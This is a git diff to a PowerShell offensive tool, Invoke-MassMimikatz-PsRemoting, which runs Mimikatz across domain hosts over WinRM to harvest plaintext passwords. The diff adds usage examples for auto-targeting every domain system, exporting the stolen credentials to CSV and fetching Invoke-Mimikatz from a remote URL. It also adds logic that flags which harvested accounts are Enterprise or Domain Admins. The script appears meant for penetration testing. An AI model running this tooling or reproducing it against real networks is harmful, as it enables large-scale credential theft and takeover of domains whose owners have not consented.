@@ -1,24 +1,47 @@
-#todo:
-# test all local and remote scenarios
-# fix psurl
-# add will's / obscuresec's self-serv mimikatz file option
-# write examples
+<#
+
+Script mod author
+    Scott Sutherland (@_nullbind), 2015 NetSPI
+
+Description
+    This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
+
+Notes
+    This is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
+    Returns data table object to pipeline with creds.
+    Weee PowerShell.
+
+Command Examples
+
+    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5
+
+    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm
+
+    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt
+
+    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”
+
+    # Run command as current domain user.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
+    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –DomainController 10.2.2.1 –Credential domain\user–AutoTarget -MaxHosts 1
+
+    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user
+
+    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
+    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 
 
 
-# Author: Scott Sutherland (@_nullbind), 2015 NetSPI
-# Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
-# "test" | Invoke-MassMimikatz-PsRemoting -AutoTarget -WinRM -OsFilter "2012" -HostList c:\temp\targets.txt -Verbose -MaxHost 5 -DomainController dc1.acme.com -Credential acme.com\user
-# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user
-# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user | Export-Csv c:\temp\passwords.csv -NoTypeInformation
-# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -verbose
-# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012" - verbose
-# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1" -verbose
-# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 | out-file .\mimikatz-output.txt
-# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -DomainController 10.1.1.1 -Credential  -verbose
-# Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
-# note: returns data table object.
-# Just for fun.
+Todo
+    fix loop
+    fix parsing so password hashes show up differently.
+    fix psurl
+    add will's / obscuresec's self-serv mimikatz file option
 
+#>
 function Invoke-MassMimikatz-PsRemoting
 {
     [CmdletBinding()]
@@ -102,6 +125,8 @@ function Invoke-MassMimikatz-PsRemoting
             $TblPasswordList.Columns.Add("Domain") | Out-Null
             $TblPasswordList.Columns.Add("Username") | Out-Null
             $TblPasswordList.Columns.Add("Password") | Out-Null  
+            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
+            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
             $TblPasswordList.Clear()
 
              # Create data table to house results
@@ -432,12 +457,6 @@ function Invoke-MassMimikatz-PsRemoting
                     $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                     $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                 }
-
-                $EaCount = $EnterpriseAdmins.row.count
-                $DaCount = $DomainAdmins.row.count
-
-                Write-Verbose "Found $EaCount Enterprise Admins."
-                Write-Verbose "Found $DaCount Domain Admins."
             }
 
 
@@ -490,9 +509,42 @@ function Invoke-MassMimikatz-PsRemoting
                     [string]$pwdomain = $_.domain.ToLower()
                     [string]$pwusername = $_.username.ToLower()
                     [string]$pwpassword = $_.password
-                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword) | Out-Null
-                }
-            
+                    
+                    # Check if user has da/ea privs - requires autotarget
+                    if ($AutoTarget)
+                    {
+                        $ea = "No"
+                        $da = "No"
+
+                        # Check if user is enterprise admin                   
+                        $EnterpriseAdmins |
+                        ForEach-Object {
+                            $EaUser = $_.GroupMember
+                            Write-Verbose "EA USER: $EaUser"
+                            Write-Verbose "Kat User: $pwusername"
+                            if ($EaUser -eq $pwusername){
+                                $ea = "Yes"
+                            }
+                        }
+                    
+                        # Check if user is domain admin
+                        $DomainAdmins |
+                        ForEach-Object {
+                            $DaUser = $_.GroupMember
+                            Write-Verbose "DA USER: $DaUser"
+                            Write-Verbose "Kat User: $pwusername"
+                            if ($DaUser -eq $pwusername){
+                                $da = "Yes"
+                            }
+                        }
+                    }else{
+                        $ea = "Unknown"
+                        $da = "Unknown"
+                    }
+
+                    # Add credential to list
+                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
+                }            
 
                 # remove sessions
                 Write-verbose "Removing ps sessions..."
@@ -513,8 +565,9 @@ function Invoke-MassMimikatz-PsRemoting
                 # Return passwords
                 if ($TblPasswordList.row.count -eq 0){
                     Write-Verbose "No credentials were recovered."
+                    Write-Verbose "Done."
                 }else{
-                    $TblPasswordList | select domain,username,password -Unique | Sort-Object domain,username,password
+                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                 }                
         }
     }
